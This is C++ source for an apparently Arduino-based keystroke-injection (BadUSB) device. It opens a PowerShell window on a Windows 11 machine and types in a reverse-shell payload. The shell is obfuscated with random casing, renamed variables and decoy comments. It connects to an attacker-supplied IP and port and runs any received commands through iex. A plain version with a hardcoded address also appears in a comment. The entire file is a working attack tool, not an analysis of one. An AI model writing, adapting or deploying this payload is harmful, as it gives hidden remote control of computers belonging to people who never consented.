#include "Win11Payload.h"

void Win11Payload::openTerminal(const bool debug) {
    // Key combo to open GNOME run dialog
    const int open_run_keys[] = {
        KEY_LEFT_GUI,
        'r'
    };

    // Command to launch powershell
    const char terminal_cmd[] = "powershell";

    // Open run dialog
    for (size_t i = 0; i < (sizeof(open_run_keys) / sizeof(open_run_keys[0])); i++) {
        KeyboardUtils::pressKey(open_run_keys[i], debug);
    }
    Keyboard.releaseAll();

    // Launch terminal
    delay(random(250, 750));
    KeyboardUtils::typeCommand(terminal_cmd, debug);
    // Delay for terminal to launch
    delay(random(250, 750));
}

void Win11Payload::executePayload(const char* ip_address, const char* port_num, const bool debug) {
    // Powershell reverse shell payload
    // 	$client = New-Object System.Net.Sockets.TCPClient('192.168.1.191', 443);
    // 	$stream = $client.GetStream();
    // 	[byte[]]$bytes = 0..65535|%{0};
    // 	while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
    // 		$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    // 		$sendback = <# Some Fancy Comment#> (iex $data 2>&1 | Out-String ) <# Some Fancy Comment#>;
    // 		$sendback2 = <# Some Fancy Comment#> $sendback + 'PS ' + (pwd).Path + '> ' <# Some Fancy Comment#>;
    // 		$sendbyte = <# Some Fancy Comment#> ([text.encoding]::ASCII).GetBytes($sendback2) <# Some Fancy Comment#>;
    // 		$stream.Write($sendbyte,0,$sendbyte.Length) <# Some Fancy Comment#>;
    // 		$stream.Flush() <# Some Fancy Comment#>
    // 	};
    // 	$client.Close()
    char clearPayload[699 + strlen(ip_address) + strlen(port_num)];
    snprintf(clearPayload, sizeof(clearPayload), "$EcDY = NEw-object SySTeM.net.socKeTs.tcPClieNt('%s' ,%s);\n"
        "$O7JUDe = $ECDY.GetstREaM();\n"
        "[BYte[]]$Xsh7f = 0..65535|%%{0};\n"   // %% because of snprintf originally %
        "while(($uhPIF8nJ = $O7juDE.read($xsh7F, 0, $XsH7F.lENGTh)) -ne 0){;\n"
            "$JkH2jn = (NEW-ObJECt -TYpEnAmE SYsTEM.TEXt.asciIEnCOdIng).GETsTRInG($xSH7F,0, $uHpif8Nj);\n"
            "$t0wX = <# SOME fAnCY COmMENt#> (ieX $JKh2JN 2>&1 | Out-STRINg ) <# SoME FanCy CoMMeNt#>;\n"
            "$MacRU5 = <# sOmE FANCY coMmENt#> $T0Wx + ('PS'+' ') + (pWD).paTH + ('>'+' ') <# sOME fAnCy COmmeNt#>;\n"
            "$HXZwXkjS = <# sOmE FAnCy COmMenT#> ([TeXt.EnCodinG]::Ascii).GETBYTes($macrU5) <# Some fanCY ComMeNT#>;\n"
            "$O7jude.wrITe($hxZWXKJs,0,$hXZwXKJS.LENgth) <# sOMe FaNcy COMmeNt#>;\n"
            "$O7JuDE.FLush() <# SOME faNCY commeNt#>\n"
        "};\n"
        "$eCDY.cloSE();", ip_address, port_num);

    // Execute reverse shell payload
    delay(random(750, 1250));
    KeyboardUtils::typeCommand(clearPayload, debug);
}